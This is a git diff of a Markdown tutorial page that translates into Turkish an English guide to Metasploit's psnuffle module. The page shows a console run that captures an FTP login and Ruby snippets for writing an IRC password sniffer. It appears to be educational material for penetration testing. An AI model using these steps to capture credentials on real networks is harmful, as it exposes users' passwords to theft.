@@ -14,13 +14,14 @@ tags:
 - metasploit Framework
 - Metasploit Framework parola tarama
 - msf parola dinleme
-excerpt: Payload, bir exploit modül türünü ifade eder. Metasploit Framework içerisinde 3 farklı grup payload modülü bulunur. Tekil, Sahneleyiciler ve Sahneler (Singles, Stagers ve Stages) olarak ayırabileceğimiz bu modüllere bakacağız. 
+excerpt: Metasploit kullanarak, ağda bulunan pop3, imap, ftp ve HTTP protokolleri üzerinden gönderilen parolaları dinleyebilirsiniz. Bu amaçla ‘psnuffle‘ modülü bulunmaktadır.
 ---
 
-Max Moser released a Metasploit password sniffing module named ‘psnuffle‘ that will sniff passwords off the wire similar to the tool dsniff. It currently supports pop3, imap, ftp, and HTTP GET. More information is available on his blog.
+Metasploit kullanarak, ağda bulunan pop3, imap, ftp ve HTTP protokolleri üzerinden gönderilen parolaları dinleyebilirsiniz. Bu amaçla ‘psnuffle‘ modülü bulunmaktadır.
 
-Using the psnuffle module is extremely simple. There are some options available but the module works great “out of the box”.
+```psnuffle``` modülü, neredeyse hiçbir ayarlama yapmaya gerek kalmadan kullanılabilir. İsterseniz dışarıdan PCAP dosyası ithal edebilirsiniz. Buradaki örnekte, ayarlar olduğu gibi kullanılacaktır. 
 
+```sh
 msf > use auxiliary/sniffer/psnuffle
 msf auxiliary(psnuffle) > show options
 
@@ -34,7 +35,6 @@ Module options:
    PROTOCOLS  all              yes       A comma-delimited list of protocols to sniff or "all".
    SNAPLEN    65535            yes       The number of bytes to capture
    TIMEOUT    1                yes       The number of seconds to wait for new data
-There are some options available, including the ability to import a PCAP capture file. We will run the psnuffle scanner in its default mode.
 
 msf auxiliary(psnuffle) > run
 [*] Auxiliary module execution completed
@@ -44,33 +44,43 @@ msf auxiliary(psnuffle) > run
 [*] Loaded protocol URL from /usr/share/metasploit-framework/data/exploits/psnuffle/url.rb...
 [*] Sniffing traffic.....
 [*] Successful FTP Login: 192.168.1.100:21-192.168.1.5:48614 >> victim / pass (220 3Com 3CDaemon FTP Server Version 2.0)
-There! We’ve captured a successful FTP login. This is an excellent tool for passive information gathering.
+```
+Gördüğünüz gibi FTP protokolünde ```victim``` kullanıcı adı ve ```pass```  parolası ortaya çıkarıldı.
 
-Psnuffle is easy to extend due to its modular design. This section will guide through the process of developing an IRC (Internet Relay Chat) protocol sniffer (Notify and Nick messages).
+## Psnuffle Özelleştirme
 
-Module Location
+İsterseniz, ```psnuffle``` aracını, varsayılan olarak dinlediği protokoller haricinde diğer protokoller için de tasarlayabilirsiniz.
 
-All the different modules are located in data/exploits/psnuffle. The names are corresponding to the protocol names used inside psnuffle. To develop our own module, we take a look at the important parts of the existing pop3 sniffer module as a template.
+Bu özelleştirme işlemi için yapılacak modüller, data/exploits/psnuffle klasörünün içine kaydedilmelidir. Yeni bir modül geliştirmek için öncelikle var olan bir modülü şablon olarak kullanabiliriz. 
 
+Aşağıda, POP3  modülünün Düzenli ifadeler kısmı görülmektedir. Bu düzenli ifadeler, dinleme esnasında hangi tür şablona uyan verilerin dikkate alınacağını tanımlamaktadır. Bir miktar karışık gibi görünebilir. Ancak düzenli ifadeleri öğrenmenizi tavsiye ediyoruz. Her yerde karşınıza çıkar ve öğrenirseniz, işinizi kolaylaştırırlar.
+
+```sh
 self.sigs = {
 :ok => /^(+OK[^n]*)n/si,
 :err => /^(-ERR[^n]*)n/si,
 :user => /^USERs+([^n]+)n/si,
 :pass => /^PASSs+([^n]+)n/si,
 :quit => /^(QUITs*[^n]*)n/si }
-This section defines the expression patterns which will be used during sniffing to identify interesting data. Regular expressions look very strange at the beginning but are very powerful. In short everything within () will be available within a variable later on in the script.
+```
 
-Defining our own psnuffle module
+## IRC Modülü
 
+Aşağıdaki örneklerde, IRC protokolü için yazılmış bir modülde olması gerekenleri görebilirsiniz.
+
+Öncelikle, dikkate alınacak sinyal tiplerini tanımlayalım. Buradaki IRC komutlarından IDENTIFY, her IRC sunucu tarafından kullanılmamaktadır. En azında Freenode bu şekilde kullanır.
+
+```
 self.sigs = {
 :user => /^(NICKs+[^n]+)/si,
 :pass => /b(IDENTIFYs+[^n]+)/si,}
-For IRC this section would look like the ones above. Not all nickservers are using IDENTIFY to send the password, but the one on Freenode does.
+```
 
-Session Definition
+## Oturum Tanımlama (Session)
 
-For every module we first have to define what ports it should handle and how the session should be tracked.
+Her modül için mutlaka tanımlanması gereken kısım, hangi Portlar ile ilgileneceğidir. Bu tanımlama için aşağıdaki şablonu kullanabilirsiniz.
 
+```sh
 return if not pkt[:tcp] # We don't want to handle anything other than tcp
 return if (pkt[:tcp].src_port != 6667 and pkt[:tcp].dst_port != 6667) # Process only packet on port 6667
 
@@ -80,8 +90,11 @@ s = find_session("#{pkt[:ip].dst_ip}:#{pkt[:tcp].dst_port}-#{pkt[:ip].src_ip}:#{
 else # When packet is coming from the server
 s = find_session("#{pkt[:ip].src_ip}:#{pkt[:tcp].src_port}-#{pkt[:ip].dst_ip}:#{pkt[:tcp].dst_port}")
 end
-Now that we have a session object that uniquely consolidates info, we can go on and process packet content that matched one of the regular expressions we defined earlier.
+```
 
+Şimdi ise ```self.sigs``` bölümünde şablonu oluşturulan türde bir paket yakalandığında ne yapılacağını ayarlamanız gerekmekte. Bunun için de aşağıdaki şablonu kullanabilirsiniz. 
+
+```sh
 case matched
 when :user # when the pattern "/^(NICKs+[^n]+)/si" is matching the packet content
 s[:user]=matches #Store the name into the session hash s for later use
@@ -96,3 +109,6 @@ when nil
 # No matches, don't do anything else # Just in case anything else is matching...
 sessions[s[:session]].merge!({k => matches}) # Just add it to the session object
 end
+```
+
+Tebrikler kendi modülünüzü yazdınız.
